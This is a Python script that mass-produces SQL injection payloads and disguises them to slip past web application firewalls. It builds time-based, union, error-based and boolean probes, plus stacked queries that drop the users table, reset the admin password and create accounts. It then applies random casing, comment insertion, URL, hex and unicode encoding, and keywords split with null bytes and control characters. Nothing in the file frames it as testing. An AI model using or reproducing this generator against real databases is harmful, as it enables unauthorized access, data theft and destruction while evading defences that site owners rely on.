import random
import string
import urllib.parse

def randomize_case(query):
    return ''.join(random.choice([c.upper(), c.lower()]) for c in query)

def insert_whitespace(query):
    return ' '.join(word + (' ' * random.randint(0, 2)) for word in query.split())

def comment_injection(query):
    comments = ['/**/', '/*!' + ''.join(random.choices(string.ascii_letters, k=3)) + '*/', '--', '#', ';--']
    words = query.split()
    return ' '.join(word + random.choice(comments) if random.random() < 0.3 else word for word in words)

def char_encode(query):
    encode_type = random.choice(['url', 'hex', 'unicode'])
    if encode_type == 'url':
        return urllib.parse.quote(query)
    elif encode_type == 'hex':
        return ''.join([f'0x{ord(c):02x}' for c in query])
    else:  # unicode
        return ''.join([f'\\u00{ord(c):02x}' for c in query])

def keyword_substitution(query):
    substitutions = {
        'SELECT': ['SELECT', 'SEL%00ECT', 'SE/**/LECT', 'S%a0E%09L%0dE%0aC%09T'],
        'UNION': ['UNION', 'UN%20ION', 'UN/**/ION', 'UNI%0dON'],
        'FROM': ['FROM', 'FR%0dOM', 'FR/**/OM', 'F%23%0aROM'],
        'WHERE': ['WHERE', 'WH%00ERE', 'WH/**/ERE', 'W%0cHERE'],
        'AND': ['AND', 'AN%0cD', 'A%0dND', '/**/AND/**/'],
        'OR': ['OR', '%0bOR', '/**/OR/**/', 'O%0dR']
    }
    for keyword, alternatives in substitutions.items():
        query = query.replace(keyword, random.choice(alternatives))
    return query

def special_char_injection(query):
    special_chars = ['%01', '%02', '%03', '%04', '%0a', '%0d', '%09']
    return ''.join(c + random.choice(special_chars) if random.random() < 0.2 else c for c in query)

def generate_time_based():
    techniques = [
        f"' AND (SELECT * FROM (SELECT(SLEEP({random.randint(1,5)})))a)--",
        f"' AND (SELECT pg_sleep({random.randint(1,5)}))--",
        f"' AND (SELECT CASE WHEN (1=1) THEN sqlite_version() ELSE 1*random() END)--",
        f"'; WAITFOR DELAY '00:00:0{random.randint(1,5)}'--",
        f"') OR '1'='1' AND (SELECT 1 FROM (SELECT(SLEEP({random.randint(1,5)})))a)-- ",
        f"1 OR SLEEP({random.randint(1,5)})",
        f"BENCHMARK({random.randint(1000000,5000000)},SHA1(1))"
    ]
    return random.choice(techniques)

def generate_union_based():
    columns = random.randint(1, 5)
    return f"' UNION SELECT {','.join(['NULL']*columns)}-- -"

def generate_error_based():
    techniques = [
        "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--",
        "' AND extractvalue(1, concat(0x7e, (SELECT version()), 0x7e))--",
        "' AND 1=CONVERT(int, (SELECT @@version))--",
        "' AND 1=CTX_SYSTEM.DRIVE_MOUNT((SELECT version FROM v$instance))--",
        "' AND 1=(SELECT 1 FROM dual WHERE 1=1 AND ROWNUM=1)--",
        "' OR 1 GROUP BY CONCAT_WS(0x3a,VERSION(),FLOOR(RAND(0)*2)) HAVING MIN(0)-- -"
    ]
    return random.choice(techniques)

def generate_boolean_based():
    techniques = [
        "' AND 1=1--",
        "' OR 'x'='x",
        "' AND substring(database(),1,1)='a'--",
        "' AND ASCII(SUBSTRING((SELECT database()),1,1))>95--",
        "' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 1*(SELECT 1 UNION SELECT 2) END)=1--"
    ]
    return random.choice(techniques)

def generate_stacked_queries():
    techniques = [
        "'; DROP TABLE users--",
        "'; INSERT INTO users (username,password) VALUES ('hacker','password123')--",
        "'; UPDATE users SET password='hacked' WHERE username='admin'--",
        "'; CREATE USER malicious IDENTIFIED BY 'password123'--"
    ]
    return random.choice(techniques)

def smart_tamper(query):
    tampering_functions = [
        randomize_case,
        insert_whitespace,
        comment_injection,
        char_encode,
        keyword_substitution,
        special_char_injection
    ]
    # Apply 1 to 3 tampering functions randomly
    for _ in range(random.randint(1, 3)):
        func = random.choice(tampering_functions)
        query = func(query)
    return query

def generate_payload():
    generators = [
        generate_time_based,
        generate_union_based,
        generate_error_based,
        generate_boolean_based,
        generate_stacked_queries
    ]
    return random.choice(generators)()

# Generate multiple payloads
def generate_payloads(n=1000):
    return [smart_tamper(generate_payload()) for _ in range(n)]